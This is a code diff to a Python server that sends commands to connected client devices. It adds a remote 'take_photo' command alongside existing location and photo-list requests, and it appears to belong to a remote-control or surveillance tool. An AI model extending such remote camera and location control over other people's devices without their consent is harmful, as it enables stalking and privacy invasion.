@@ -321,6 +321,15 @@ def send_to_device(ident, cmd):
                         CHAT_CLIENT_LIST[sock_fd].request_client_location()
                     elif cmd == "photo_list":
                         CHAT_CLIENT_LIST[sock_fd].request_client_photo_list()
+                    elif "take_photo" in cmd:
+                        camera_number = "1"
+                        file_name = None
+                        cmd_arr = cmd.split(",")
+                        if len(cmd_arr) >= 2:
+                            camera_number = cmd_arr[1]
+                        if len(cmd_arr) >= 3:
+                            file_name = cmd_arr[2]
+                        CHAT_CLIENT_LIST[sock_fd].request_client_take_photo(camera_number)
                     else:
                         CHAT_CLIENT_LIST[sock_fd].send_command(cmd)
                 except socket.error as err:
